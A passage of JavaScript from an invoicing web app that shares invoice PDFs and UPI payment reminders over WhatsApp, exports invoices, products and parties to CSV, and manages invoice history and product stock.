        updateWhatsAppBotPillUI(whatsappBotStatus);
      }
    } catch (e) {}
  }

  const useBot = whatsappBotStatus && whatsappBotStatus.isReady && !whatsappBotStatus.webDirect;

  let pdfBase64 = precomputedBase64;
  if (!pdfBase64) {
    try {
      const gen = await generateInvoicePdfBlob(details);
      pdfBase64 = gen ? gen.pdfBase64 : null;
    } catch (err) {
      console.warn("Could not generate PDF for auto dispatch:", err);
    }
  }

  if (useBot && cleanPhone) {
    try {
      const res = await fetch('/api/whatsapp/send-invoice', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          phone: cleanPhone,
          text,
          filename,
          pdfBase64
        })
      });
      const data = await res.json();
      if (data && data.ok) {
        if (typeof playSuccessChime === 'function') playSuccessChime();
        console.log(`✅ Automated WhatsApp Invoice sent to +${cleanPhone}`);
        showFloatingToast(`📱 Invoice #${details.invoiceNo} & PDF receipt sent automatically to ${custName} (+${cleanPhone}) via WhatsApp!`, 5000);
        return true;
      } else {
        console.warn("Auto WhatsApp dispatch response:", data);
      }
    } catch (err) {
      console.warn("Auto WhatsApp dispatch notice:", err);
    }
  } else {
    // When bot is offline, do NOT trigger redirects during background auto-dispatch
    console.log("WhatsApp Bot is offline. Automatic silent background dispatch completed without browser redirect.");
  }
  return false;
}

// Dual-Mode Native Share: Auto background bot when linked on PC, instant unblocked 1-click WhatsApp on manual trigger
window.shareInvoicePdfNative = async function(details, btnEl = null, force1Click = false) {
  if (!details || !details.invoiceNo) {
    showFloatingToast("⚠️ Please add items to invoice before sharing!", "warning");
    return;
  }

  let rawPhone = getCustomerPhoneNumber(details);
  let cleanPhone = "";
  if (rawPhone && rawPhone.toString().replace(/\D/g, '').length >= 10) {
    cleanPhone = formatWhatsAppPhone(rawPhone);
  } else {
    // If not entered in billing form, prompt user for phone number
    const custName = details.buyer?.name || details.customerName || 'Customer';
    const entered = prompt(`📱 Enter 10-digit WhatsApp number for ${custName}\n(Or press OK / Cancel to select contact directly inside WhatsApp):`, "");
    if (entered && entered.trim().replace(/\D/g, '').length >= 10) {
      cleanPhone = formatWhatsAppPhone(entered.trim());
      if (details.buyer) details.buyer.phone = entered.trim();
      savePhoneToPartyDb(custName, entered.trim());
    }
  }

  const isWebDirect = whatsappBotStatus && whatsappBotStatus.webDirect;
  const useBackgroundBot = whatsappBotStatus && whatsappBotStatus.isReady && !isWebDirect && !force1Click;

  const fullShareText = typeof generateWhatsAppInvoiceMessage === 'function'
    ? generateWhatsAppInvoiceMessage(details)
    : formatInvoiceWhatsAppSummary(details);
  const custName = details.buyer?.name || details.customerName || 'Customer';
  const customerClean = custName.replace(/[^a-zA-Z0-9]/g, '_');
  const filename = `Invoice_${details.invoiceNo}_${customerClean}.pdf`;

  let origHtml = "";
  if (btnEl && btnEl.tagName) {
    origHtml = btnEl.innerHTML;
  }

  // --- ULTRA-FAST PATH: If Background Bot is active, send document PDF in background ---
  if (useBackgroundBot && cleanPhone) {
    if (btnEl && btnEl.tagName) {
      btnEl.innerHTML = `<i class="fa-solid fa-paper-plane fa-spin"></i> Sending PDF via Bot...`;
      btnEl.disabled = true;
    }
    try {
      let pdfBase64 = null;
      try {
        const gen = await generateInvoicePdfBlob(details);
        pdfBase64 = gen ? gen.pdfBase64 : null;
      } catch (e) {
        console.warn("Could not compile PDF for bot share:", e);
      }

      const fastRes = await fetch('/api/whatsapp/send-invoice', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ phone: cleanPhone, text: fullShareText, filename, pdfBase64 })
      });
      const fastData = await fastRes.json();
      if (fastData && fastData.ok) {
        if (typeof playSuccessChime === 'function') playSuccessChime();
        if (btnEl && btnEl.tagName) {
          btnEl.innerHTML = `<i class="fa-solid fa-check text-success"></i> Sent PDF!`;
          setTimeout(() => {
            btnEl.innerHTML = origHtml;
            btnEl.disabled = false;
          }, 2000);
        }
        showFloatingToast(`✅ Invoice #${details.invoiceNo} & PDF receipt sent via WhatsApp Bot to +${cleanPhone}!`);
        return;
      }
    } catch (fastErr) {
      console.warn("Background bot dispatch failed, falling back to manual WhatsApp:", fastErr);
    }
  }

  // Fallback: 1-click WhatsApp Web/App when user explicitly clicked manual share button and bot is offline
  const waUrl = launchWhatsAppWebOrApp(cleanPhone, fullShareText);
  openWhatsAppDirect(waUrl);

  if (btnEl && btnEl.tagName) {
    btnEl.innerHTML = `<i class="fa-solid fa-check text-success"></i> Opened!`;
    setTimeout(() => {
      btnEl.innerHTML = origHtml;
      btnEl.disabled = false;
    }, 2000);
  }

  showFloatingToast(cleanPhone ? `📲 Opening WhatsApp chat for +${cleanPhone}...` : `📲 Opening WhatsApp to choose customer contact...`, 4000);

  // Optional background non-blocking PDF download / upload to Google Drive
  setTimeout(async () => {
    try {
      populateA4PrintOverlay(details);
      const element = document.getElementById("print-invoice-wrapper");
      if (!element || typeof html2pdf === 'undefined') return;

      const opt = {
        margin: [3, 3, 3, 3],
        filename: filename,
        image: { type: 'jpeg', quality: 0.95 },
        html2canvas: { scale: 1.2, useCORS: true, logging: false },
        jsPDF: { unit: 'mm', format: 'a4', orientation: 'portrait' }
      };

      element.style.display = "block";
      const pdfBlob = await html2pdf().set(opt).from(element).outputPdf('blob');
      element.style.display = "none";

      // On desktop, auto-download so merchant can drag into WhatsApp Web if desired
      if (!isMobile) {
        try {
          const a = document.createElement('a');
          a.href = URL.createObjectURL(pdfBlob);
          a.download = filename;
          document.body.appendChild(a);
          a.click();
          setTimeout(() => {
            try { document.body.removeChild(a); } catch (e) {}
          }, 500);
        } catch (e) {}
      }

      // Background upload to Google Drive if server API is reachable
      const reader = new FileReader();
      reader.onloadend = async () => {
        try {
          await fetch("/api/invoices/upload-pdf", {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify({ filename, invoiceNo: details.invoiceNo, id: details.id, pdfBase64: reader.result })
          });
        } catch (e) {}
      };
      reader.readAsDataURL(pdfBlob);
    } catch (bgErr) {
      console.warn("Background PDF generation note:", bgErr);
    }
  }, 200);
};

window.openWhatsappWebChat = function() {
  const sec = globalSettings?.security || {};
  if (sec.whatsappProtectChats !== false && !isWhatsAppUnlocked()) {
    promptWhatsAppSecurity(window.openWhatsappWebChat);
    return;
  }

  const modalEl = document.getElementById("whatsapp-pdf-guide-modal");
  if (modalEl) modalEl.classList.add("hidden");

  const phoneInput = document.getElementById("guide-whatsapp-phone");
  const enteredPhone = phoneInput ? phoneInput.value.trim() : "";
  const cleanPhone = formatWhatsAppPhone(enteredPhone);

  let url = "";
  if (cleanPhone) {
    url = `https://api.whatsapp.com/send?phone=${cleanPhone}&text=${encodeURIComponent(pendingWaMsg)}`;
  } else {
    url = `https://api.whatsapp.com/send?text=${encodeURIComponent(pendingWaMsg)}`;
  }

  openWhatsAppDirect(url);
};

window.closeWhatsappGuideModal = function() {
  const modalEl = document.getElementById("whatsapp-pdf-guide-modal");
  if (modalEl) {
    modalEl.classList.add("hidden");
    modalEl.style.setProperty("display", "none", "important");
  }
};

window.shareCurrentInvoiceWhatsApp = function(btnEl = null) {
  const button = btnEl || document.querySelector(".btn-share-whatsapp") || document.querySelector(".btn-whatsapp");
  return window.saveCurrentInvoiceRecord('share_whatsapp', button);
};

let currentBalanceQrInv = null;

window.openBalanceQrModal = function(id) {
  const inv = invoicesDb.find(i => i.id === id);
  if (!inv) return;
  const details = inv.details || {};
  const total = parseFloat(inv.total || 0);
  const paid = parseFloat(details.paidAmount !== undefined ? details.paidAmount : (details.paymentStatus === 'Paid' ? total : 0));
  const balance = Math.max(0, total - paid);

  currentBalanceQrInv = { inv, details, total, paid, balance };

  const invNoEl = document.getElementById("bal-qr-inv-no");
  if (invNoEl) invNoEl.textContent = `#${inv.invoiceNo || ''}`;
  const custEl = document.getElementById("bal-qr-customer");
  if (custEl) custEl.textContent = inv.customerName || 'Customer';
  const totEl = document.getElementById("bal-qr-total");
  if (totEl) totEl.textContent = formatCurrency(total);
  const paidEl = document.getElementById("bal-qr-paid");
  if (paidEl) paidEl.textContent = formatCurrency(paid);
  const balEl = document.getElementById("bal-qr-balance");
  if (balEl) balEl.textContent = formatCurrency(balance);

  const realUpiId = (globalSettings.upiId || globalSettings.bank?.upi || "7386262139@upi").trim();
  const upiIdEl = document.getElementById("bal-qr-upi-id");
  if (upiIdEl) upiIdEl.textContent = realUpiId;

  const upiName = encodeURIComponent((globalSettings.company?.name || "Aaryan Aqua Needs").replace(/[^a-zA-Z0-9 ]/g, '').trim());
  const cleanNote = `Bill${inv.invoiceNo || '1'}`.replace(/[^a-zA-Z0-9]/g, '');
  const upiUri = `upi://pay?pa=${realUpiId}&pn=${upiName}&am=${balance.toFixed(2)}&cu=INR&tn=${cleanNote}`;

  const canvas = document.getElementById("balance-qr-canvas");
  const imgEl = document.getElementById("balance-qr-img");

  let canvasSuccess = false;
  if (canvas && typeof QRious !== "undefined") {
    try {
      new QRious({
        element: canvas,
        value: upiUri,
        size: 300,
        level: 'H'
      });
      canvas.style.display = "block";
      if (imgEl) imgEl.style.display = "none";
      canvasSuccess = true;
    } catch (e) {
      console.warn("QRious canvas render failed, switching to image fallback:", e);
    }
  }

  if (!canvasSuccess && imgEl) {
    if (canvas) canvas.style.display = "none";
    imgEl.src = `https://api.qrserver.com/v1/create-qr-code/?size=300x300&data=${encodeURIComponent(upiUri)}`;
    imgEl.style.display = "block";
  }

  const modalEl = document.getElementById("balance-qr-modal");
  if (modalEl) modalEl.classList.remove("hidden");
};

window.closeBalanceQrModal = function() {
  const modalEl = document.getElementById("balance-qr-modal");
  if (modalEl) {
    modalEl.classList.add("hidden");
    modalEl.style.setProperty("display", "none", "important");
  }
};

window.shareBalanceQrWhatsApp = function() {
  if (!currentBalanceQrInv) return;
  const { inv } = currentBalanceQrInv;
  closeBalanceQrModal();
  sendWhatsAppPaymentReminder(inv.id);
};

window.sendWhatsAppPaymentReminder = async function(id, btnEl = null) {
  const inv = invoicesDb.find(i => i.id === id);
  if (!inv) return;
  const details = inv.details || {};
  const total = parseFloat(inv.total || 0);
  const paid = parseFloat(details.paidAmount !== undefined ? details.paidAmount : (details.paymentStatus === 'Paid' ? total : 0));
  const balance = Math.max(0, total - paid);

  if (balance <= 0 && details.paymentStatus === 'Paid') {
    showFloatingToast(`Invoice #${inv.invoiceNo} is already fully paid! No balance reminder needed.`, "info");
    return;
  }

  let rawPhone = getCustomerPhoneNumber(details);
  let cleanPhone = "";
  if (rawPhone && rawPhone.toString().replace(/\D/g, '').length >= 10) {
    cleanPhone = formatWhatsAppPhone(rawPhone);
  } else {
    const custName = details.buyer?.name || inv.customerName || 'Customer';
    const entered = prompt(`📱 Enter 10-digit WhatsApp mobile number for ${custName}\n(Or press OK / Cancel to select contact in WhatsApp):`, rawPhone || "");
    if (entered && entered.trim().replace(/\D/g, '').length >= 10) {
      cleanPhone = formatWhatsAppPhone(entered.trim());
      if (details.buyer) details.buyer.phone = entered.trim();
      savePhoneToPartyDb(custName, entered.trim());
    }
  }

  const realUpiId = (globalSettings.upiId || globalSettings.bank?.upi || "7386262139@upi").trim();
  const companyName = globalSettings.company?.name || "AARYAN AQUA NEEDS";
  const upiName = encodeURIComponent(companyName.replace(/[^a-zA-Z0-9 ]/g, '').trim());
  const cleanNote = `Bill${inv.invoiceNo || '1'}`.replace(/[^a-zA-Z0-9]/g, '');
  const upiPayLink = `upi://pay?pa=${realUpiId}&pn=${upiName}&am=${balance.toFixed(2)}&cu=INR&tn=${cleanNote}`;

  let reminderText = `🏛️ *${companyName}*\n`;
  reminderText += `⚠️ *PAYMENT REMINDER*\n`;
  reminderText += `-----------------------------------\n`;
  reminderText += `📄 *Tax Invoice #:* #${inv.invoiceNo}\n`;
  reminderText += `👤 *Customer:* ${inv.customerName || details.buyer?.name || 'Customer'}\n`;
  reminderText += `📅 *Bill Date:* ${formatInputDateString(inv.invoiceDate)}\n`;
  reminderText += `💰 *Total Bill Amount:* ₹ ${formatCurrency(total)}\n`;
  reminderText += `✅ *Amount Paid:* ₹ ${formatCurrency(paid)}\n`;
  reminderText += `🔴 *PENDING BALANCE DUE:* ₹ ${formatCurrency(balance)}\n`;
  reminderText += `-----------------------------------\n`;
  reminderText += `📲 *Pay Directly via UPI App (GPay / PhonePe / Paytm):*\n`;
  reminderText += `${upiPayLink}\n\n`;
  reminderText += `💳 Or send to UPI ID: *${realUpiId}*\n`;
  reminderText += `-----------------------------------\n`;
  reminderText += `Kindly settle the pending balance at your earliest convenience. Thank you! 🙏`;

  let origHtml = "";
  if (btnEl && btnEl.tagName) {
    origHtml = btnEl.innerHTML;
    btnEl.innerHTML = `<i class="fa-solid fa-spinner fa-spin"></i>`;
    btnEl.disabled = true;
  }

  const isMobile = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
  const isWebDirect = whatsappBotStatus && whatsappBotStatus.webDirect;
  const useBot = !isMobile && whatsappBotStatus && whatsappBotStatus.isReady && !isWebDirect;

  if (useBot && cleanPhone) {
    try {
      const res = await fetch('/api/whatsapp/send-message', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ phone: cleanPhone, text: reminderText })
      });
      const data = await res.json();
      if (data && data.ok) {
        playSuccessChime();
        if (btnEl && btnEl.tagName) {
          btnEl.innerHTML = `<i class="fa-solid fa-check text-success"></i>`;
          setTimeout(() => {
            btnEl.innerHTML = origHtml;
            btnEl.disabled = false;
          }, 2000);
        }
        showFloatingToast(`🔔 Payment reminder (₹ ${formatCurrency(balance)}) sent directly to +${cleanPhone} via WhatsApp Bot!`);
        return;
      }
    } catch (e) {
      console.warn("Bot reminder notice:", e);
    }
  }

  // Fallback to 1-Click WhatsApp
  if (btnEl && btnEl.tagName) {
    btnEl.innerHTML = origHtml;
    btnEl.disabled = false;
  }
  const sec = globalSettings?.security || {};
  if (sec.whatsappProtectChats !== false && !isWhatsAppUnlocked()) {
    promptWhatsAppSecurity(() => {
      const waUrl = launchWhatsAppWebOrApp(cleanPhone, reminderText);
      openWhatsAppDirect(waUrl);
      showFloatingToast(cleanPhone ? `🔔 Opening WhatsApp reminder for +${cleanPhone}...` : `🔔 Opening WhatsApp to send payment reminder...`);
    });
    return;
  }

  const waUrl = launchWhatsAppWebOrApp(cleanPhone, reminderText);
  openWhatsAppDirect(waUrl);
  showFloatingToast(cleanPhone ? `🔔 Opening WhatsApp reminder for +${cleanPhone}...` : `🔔 Opening WhatsApp to send payment reminder...`);
};

window.shareInvoiceToWhatsApp = function(id, btnEl = null) {
  const inv = invoicesDb.find(i => i.id === id);
  if (!inv) return;
  shareInvoicePdfNative(inv.details, btnEl);
};

// --- ADVANCED DATA EXPORTERS (CSV / EXCEL) ---
function downloadCSVFile(filename, csvContent) {
  const blob = new Blob([csvContent], { type: "text/csv;charset=utf-8;" });
  const url = URL.createObjectURL(blob);
  const a = document.createElement("a");
  a.href = url;
  a.download = filename;
  document.body.appendChild(a);
  a.click();
  document.body.removeChild(a);
  URL.revokeObjectURL(url);
}

window.exportInvoicesToCSV = function() {
  if (!invoicesDb || invoicesDb.length === 0) {
    alert("No invoices available to export.");
    return;
  }
  let csv = "Invoice No,Date,Customer Name,Payment Status,Payment Mode,Items Count,Total (INR)\n";
  invoicesDb.forEach(inv => {
    const details = inv.details || {};
    const row = [
      `"${inv.invoiceNo || ""}"`,
      `"${inv.invoiceDate || ""}"`,
      `"${(inv.customerName || "").replace(/"/g, '""')}"`,
      `"${details.paymentStatus || "Paid"}"`,
      `"${details.paymentMode || "UPI / QR"}"`,
      inv.itemsCount || 0,
      inv.total || 0
    ].join(",");
    csv += row + "\n";
  });
  downloadCSVFile(`Invoices_Export_${new Date().toISOString().split('T')[0]}.csv`, csv);
};

window.exportProductsToCSV = function() {
  if (!productsDb || productsDb.length === 0) {
    alert("No products available to export.");
    return;
  }
  let csv = "ID,Description,HSN,Pack Size,Unit,Rate (INR),Stock\n";
  productsDb.forEach(p => {
    const row = [
      `"${p.id || ""}"`,
      `"${(p.description || "").replace(/"/g, '""')}"`,
      `"${p.hsn || ""}"`,
      `"${p.packSize || ""}"`,
      `"${p.unit || ""}"`,
      p.rate || 0,
      p.stock || 0
    ].join(",");
    csv += row + "\n";
  });
  downloadCSVFile(`Products_Inventory_${new Date().toISOString().split('T')[0]}.csv`, csv);
};

window.exportPartiesToCSV = function() {
  if (!partiesDb || partiesDb.length === 0) {
    alert("No party profiles available to export.");
    return;
  }
  let csv = "Type,Customer Name,Company Name,Address,GSTIN,State,Phone\n";
  partiesDb.forEach(p => {
    const row = [
      `"${p.type || "receiver"}"`,
      `"${(p.name || "").replace(/"/g, '""')}"`,
      `"${(p.company || "").replace(/"/g, '""')}"`,
      `"${(p.address || "").replace(/"/g, '""')}"`,
      `"${p.gstin || ""}"`,
      `"${p.state || ""}"`,
      `"${p.phone || ""}"`
    ].join(",");
    csv += row + "\n";
  });
  downloadCSVFile(`Parties_Export_${new Date().toISOString().split('T')[0]}.csv`, csv);
};

window.filterInvoicesByStatus = function() {
  const statusEl = document.getElementById("filter-history-status");
  const statusFilter = statusEl ? statusEl.value : "all";
  const query = elements.searchHistoryInput ? elements.searchHistoryInput.value.toLowerCase().trim() : "";

  let filtered = invoicesDb;

  if (statusFilter !== "all") {
    filtered = filtered.filter(inv => (inv.details?.paymentStatus || "Paid") === statusFilter);
  }

  if (query) {
    filtered = filtered.filter(inv => 
      (inv.invoiceNo && inv.invoiceNo.toLowerCase().includes(query)) || 
      (inv.customerName && inv.customerName.toLowerCase().includes(query))
    );
  }

  renderHistoryTableRows(filtered);
};

// --- SAVED INVOICE VIEW EDIT & DELETE HISTORY ---
function loadInvoicesHistoryTable() {
  loadAllDatabases();
  elements.historyCount.textContent = invoicesDb.length;
  renderHistoryTableRows(invoicesDb);
}

function renderHistoryTableRows(records) {
  elements.historyInvoicesBody.innerHTML = "";
  if (records.length === 0) {
    elements.historyInvoicesBody.innerHTML = `
      <tr>
        <td colspan="7" class="text-center text-muted">No invoices found.</td>
      </tr>
    `;
    return;
  }

  records.slice().reverse().forEach(inv => {
    const details = inv.details || {};
    const status = details.paymentStatus || 'Paid';
    let badgeClass = 'badge-paid';
    if (status === 'Partial') badgeClass = 'badge-partial';
    if (status === 'Unpaid') badgeClass = 'badge-unpaid';

    const total = parseFloat(inv.total || 0);
    const paid = parseFloat(details.paidAmount !== undefined ? details.paidAmount : (status === 'Paid' ? total : 0));
    const balance = Math.max(0, total - paid);

    let balanceQrBtn = "";
    if (balance > 0 || status === 'Partial' || status === 'Unpaid') {
      balanceQrBtn = `
        <button class="action-btn share" onclick="openBalanceQrModal('${inv.id}')" title="View Balance UPI QR Code (₹ ${formatCurrency(balance)})" style="background: rgba(6, 182, 212, 0.15); color: #06b6d4;"><i class="fa-solid fa-qrcode"></i></button>
        <button class="action-btn share" onclick="sendWhatsAppPaymentReminder('${inv.id}', this)" title="Send 1-Click WhatsApp Payment Reminder (₹ ${formatCurrency(balance)})" style="background: rgba(245, 158, 11, 0.15); color: #d97706;"><i class="fa-solid fa-bell"></i></button>
      `;
    }

    const tr = document.createElement("tr");
    tr.innerHTML = `
      <td style="font-weight: 700; color: var(--primary-teal);">#${inv.invoiceNo}</td>
      <td>${formatInputDateString(inv.invoiceDate)}</td>
      <td style="font-weight: 600;">${inv.customerName}</td>
      <td class="text-center">${inv.itemsCount}</td>
      <td style="text-align: right; font-weight: 700;">₹ ${formatCurrency(inv.total)}</td>
      <td class="text-center"><span class="badge-status ${badgeClass}">${status}</span></td>
      <td class="actions-cell">
        ${balanceQrBtn}
        <button class="action-btn edit" onclick="editSavedInvoice('${inv.id}')" title="Edit"><i class="fa-solid fa-pen-to-square"></i></button>
        <button class="action-btn print" onclick="printSavedInvoice('${inv.id}')" title="Print A4"><i class="fa-solid fa-print"></i></button>
        <button class="action-btn print" onclick="downloadSavedInvoicePdf('${inv.id}', this)" title="Download PDF"><i class="fa-solid fa-file-pdf text-rose"></i></button>
        <button class="action-btn print" onclick="printSavedInvoiceThermal('${inv.id}')" title="Print Thermal POS"><i class="fa-solid fa-receipt"></i></button>
        <button class="action-btn share btn-whatsapp" onclick="shareInvoiceToWhatsApp('${inv.id}', this)" title="Share PDF via WhatsApp"><i class="fa-brands fa-whatsapp"></i></button>
        <button class="action-btn share" onclick="shareInvoiceToTelegram('${inv.id}', this)" title="Share PDF to Telegram"><i class="fa-solid fa-paper-plane text-teal"></i></button>
        <button class="action-btn delete" onclick="deleteSavedInvoice('${inv.id}')" title="Delete"><i class="fa-solid fa-trash"></i></button>
      </td>
    `;
    elements.historyInvoicesBody.appendChild(tr);
  });
}

elements.searchHistoryInput.addEventListener("input", () => {
  window.filterInvoicesByStatus();
});

window.editSavedInvoice = function(id) {
  const inv = invoicesDb.find(i => i.id === id);
  if (inv) {
    currentInvoice = JSON.parse(JSON.stringify(inv.details));
    currentInvoice.id = inv.id;
    currentInvoice.isEditing = true;
    
    // Safety check default structures
    if (!currentInvoice.buyer) {
      currentInvoice.buyer = { name: "", address: "", gstin: "", phone: "", state: "Andhra Pradesh", stateCode: "37" };
    }
    if (!currentInvoice.consignee) {
      currentInvoice.consignee = { name: "", address: "", gstin: "", state: "Andhra Pradesh", stateCode: "37" };
    }
    if (!currentInvoice.items) {
      currentInvoice.items = [];
    }

    switchTab("billing");

    elements.billInvoiceType.value = currentInvoice.invoiceType || "Bill of Supply";
    elements.billHeaderLogo.value = currentInvoice.headerLogo || "ganesha";
    elements.billInvoiceNo.value = currentInvoice.invoiceNo || "";
    elements.billInvoiceDate.value = currentInvoice.invoiceDate || "";
    elements.billBuyerOrderNo.value = currentInvoice.buyerOrderNo || "";
    elements.billBuyerOrderDate.value = currentInvoice.buyerOrderDate || "";
    elements.billTransportMode.value = currentInvoice.transportMode || "";
    elements.billDestination.value = currentInvoice.destination || "Andhra Pradesh";
    elements.billSupplyStateCode.value = currentInvoice.supplyStateCode || "37";

    elements.billBuyerName.value = currentInvoice.buyer.name || "";
    elements.billBuyerAddress.value = currentInvoice.buyer.address || "";
    elements.billBuyerGstin.value = currentInvoice.buyer.gstin || "";
    elements.billBuyerPhone.value = currentInvoice.buyer.phone || "";
    elements.billBuyerState.value = currentInvoice.buyer.state || "Andhra Pradesh";
    elements.billBuyerStateCode.value = currentInvoice.buyer.stateCode || "37";

    elements.billConsigneeName.value = currentInvoice.consignee.name || "";
    elements.billConsigneeAddress.value = currentInvoice.consignee.address || "";
    elements.billConsigneeGstin.value = currentInvoice.consignee.gstin || "";
    elements.billConsigneePhone.value = currentInvoice.consignee.phone || "";
    elements.billConsigneeState.value = currentInvoice.consignee.state || "Andhra Pradesh";
    elements.billConsigneeStateCode.value = currentInvoice.consignee.stateCode || "37";

    elements.billPaymentStatus.value = currentInvoice.paymentStatus || "Paid";
    elements.billPaymentMode.value = currentInvoice.paymentMode || "UPI / QR";
    elements.billPaidAmount.value = currentInvoice.paidAmount !== undefined ? currentInvoice.paidAmount : (currentInvoice.total || 0);
    elements.billBalancePaid.value = currentInvoice.balancePaid !== undefined ? currentInvoice.balancePaid : 0;
    if (elements.billPaymentDate) {
      elements.billPaymentDate.value = currentInvoice.paymentDate || currentInvoice.invoiceDate || "";
    }

    handlePaymentStatusChange();
    calculateSummaryAndTable();
  }
};

window.printSavedInvoice = function(id) {
  const inv = invoicesDb.find(i => i.id === id);
  if (inv) {
    populateA4PrintOverlay(inv.details);
    document.body.classList.remove("printing-thermal");
    setTimeout(() => {
      window.print();
    }, 100);
  }
};

window.deleteSavedInvoice = function(id) {
  if (confirm("Delete this invoice record from history?")) {
    const inv = invoicesDb.find(i => i.id === id);
    if (inv) {
      reconcileProductInventoryStock(inv.details, null);
    }
    
    // Track deleted IDs locally to prevent sync recreation
    let deletedIds = [];
    try {
      deletedIds = JSON.parse(localStorage.getItem("deleted_invoice_ids")) || [];
    } catch (e) {
      deletedIds = [];
    }
    if (!deletedIds.includes(id)) {
      deletedIds.push(id);
      localStorage.setItem("deleted_invoice_ids", JSON.stringify(deletedIds));
    }

    invoicesDb = invoicesDb.filter(inv => inv.id !== id);
    localStorage.setItem("invoices", JSON.stringify(invoicesDb));
    fetch("/api/invoices/delete", {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ id })
    }).catch(err => console.warn("Failed to delete invoice from server:", err));
    
    // Automatically recalculate next invoice number sequence
    autoSuggestInvoiceNo();
    
    updateDashboardOverview();
    if (!elements.historyInvoicesBody.closest('.content-view').classList.contains('hidden')) {
      loadInvoicesHistoryTable();
    }
  }
};

// --- PRODUCTS DIALOG MODAL CONTROLLER ---
window.calculateProductModalValues = function() {
  const rateInput = document.getElementById("modal-prod-rate");
  const discInput = document.getElementById("modal-prod-discount");
  const stockInput = document.getElementById("modal-prod-stock");

  const rate = parseFloat(rateInput?.value) || 0;
  const disc = parseFloat(discInput?.value) || 0;
  const stock = Math.max(0, parseInt(stockInput?.value, 10) || 0);

  const discountAmount = (rate * disc) / 100;
  const valAfterDisc = Math.max(0, rate - discountAmount);
  const totalVal = stock * valAfterDisc;

  const valAfterDiscEl = document.getElementById("modal-preview-val-after-disc");
  const totalValEl = document.getElementById("modal-preview-total-val");

  if (valAfterDiscEl) {
    const discLabel = disc > 0 ? ` <span style="font-size: 11px; color: #64748b; font-weight: normal;">(-${disc}% = -₹ ${formatCurrency(discountAmount)})</span>` : '';
    valAfterDiscEl.innerHTML = `₹ ${formatCurrency(valAfterDisc)}${discLabel}`;
  }
  if (totalValEl) {
    totalValEl.textContent = `₹ ${formatCurrency(totalVal)}`;
  }
};

window.openProductModal = function(id = "") {
  document.getElementById("modal-product-form").reset();
  document.getElementById("modal-prod-id").value = "";
  document.getElementById("modal-prod-unit").value = "Bucket";
  document.getElementById("modal-prod-discount").value = "0";
  document.getElementById("modal-prod-stock").value = "0";

  if (id) {
    const prod = productsDb.find(p => p.id === id);
    if (prod) {
      document.getElementById("product-modal-title").textContent = "Edit Product";
      document.getElementById("modal-prod-id").value = prod.id;
      document.getElementById("modal-prod-desc").value = prod.description;
      document.getElementById("modal-prod-hsn").value = prod.hsn || "";
      document.getElementById("modal-prod-pack").value = prod.packSize || "";
      document.getElementById("modal-prod-unit").value = prod.unit || "Bucket";
      document.getElementById("modal-prod-rate").value = prod.rate;
      document.getElementById("modal-prod-discount").value = prod.discount || 0;
      document.getElementById("modal-prod-stock").value = prod.stock || 0;
    }
  } else {
    document.getElementById("product-modal-title").textContent = "Add New Product";
  }

  calculateProductModalValues();
  document.getElementById("product-modal").classList.remove("hidden");
};

window.closeProductModal = function() {
  const modalEl = document.getElementById("product-modal");
  if (modalEl) {
    modalEl.classList.add("hidden");
    modalEl.style.setProperty("display", "none", "important");
  }
};

window.saveProductModal = function(e) {
  e.preventDefault();
  const id = document.getElementById("modal-prod-id").value;
  const desc = document.getElementById("modal-prod-desc").value.toUpperCase().trim();
  const hsn = document.getElementById("modal-prod-hsn").value.trim();
  const pack = document.getElementById("modal-prod-pack").value.trim();
  const unit = document.getElementById("modal-prod-unit").value.trim();
  const rate = parseFloat(document.getElementById("modal-prod-rate").value) || 0;
  const disc = parseFloat(document.getElementById("modal-prod-discount").value) || 0;
  const stock = Math.max(0, parseInt(document.getElementById("modal-prod-stock").value, 10) || 0);

  let oldStock = 0;
  if (id) {
    const existing = productsDb.find(p => p.id === id);
    if (existing) oldStock = parseInt(existing.stock, 10) || 0;
  }

  const product = { id: id || "prod-" + Date.now(), description: desc, hsn, packSize: pack, unit, rate, gstRate: 0, discount: disc, stock: stock, updatedAt: new Date().toISOString() };

  if (id) {
    const idx = productsDb.findIndex(p => p.id === id);
    if (idx > -1) productsDb[idx] = product;
  } else {
    productsDb.push(product);
  }

  localStorage.setItem("products", JSON.stringify(productsDb));
  syncDatabaseToServer("products", productsDb);
  closeProductModal();
  loadProductsDatabaseTable();
  populateBillingSelectors();
  if (window.triggerDatabaseSync) window.triggerDatabaseSync();

  sendStockTelegramReport(product, id ? "Product Details / Stock Edited" : "New Product Added to Inventory", oldStock, stock);
};

window.adjustProductStock = function(id, delta) {
  const prod = productsDb.find(p => p.id === id);
  if (!prod) return;
  const current = parseInt(prod.stock, 10) || 0;
  prod.stock = Math.max(0, current + delta);
  prod.updatedAt = new Date().toISOString();
  
  localStorage.setItem("products", JSON.stringify(productsDb));
  syncDatabaseToServer("products", productsDb);
  loadProductsDatabaseTable();
  if (window.triggerDatabaseSync) window.triggerDatabaseSync();

  const actionText = delta > 0 ? `Inline Stock Added (+${delta})` : `Inline Stock Reduced (${delta})`;
  sendStockTelegramReport(prod, actionText, current, prod.stock);
};

window.updateProductDiscountInline = function(id, newDiscount) {
  const prod = productsDb.find(p => p.id === id);
  if (!prod) return;
  const parsedDisc = Math.max(0, Math.min(100, parseFloat(newDiscount) || 0));
  prod.discount = parsedDisc;
  prod.updatedAt = new Date().toISOString();
  localStorage.setItem("products", JSON.stringify(productsDb));
  syncDatabaseToServer("products", productsDb);
  loadProductsDatabaseTable();
  populateBillingSelectors();
  if (window.triggerDatabaseSync) window.triggerDatabaseSync();
  showFloatingToast(`🏷️ Discount for "${prod.description}" set to ${parsedDisc}%!`);
};

function loadProductsDatabaseTable() {
  loadAllDatabases();
  elements.productCount.textContent = productsDb.length;
  renderProductsTable(productsDb);
}

function renderProductsTable(records) {
  elements.productsListBody.innerHTML = "";
  if (records.length === 0) {
    elements.productsListBody.innerHTML = `
      <tr>
        <td colspan="9" class="text-center text-muted" style="padding: 32px; font-weight: 500;">
          <i class="fa-solid fa-box-open" style="font-size: 24px; color: #cbd5e1; display: block; margin-bottom: 8px;"></i>
          No products found matching your filter criteria.
        </td>
      </tr>
    `;
    const totalCountFooter = document.getElementById("prod-total-count-footer");
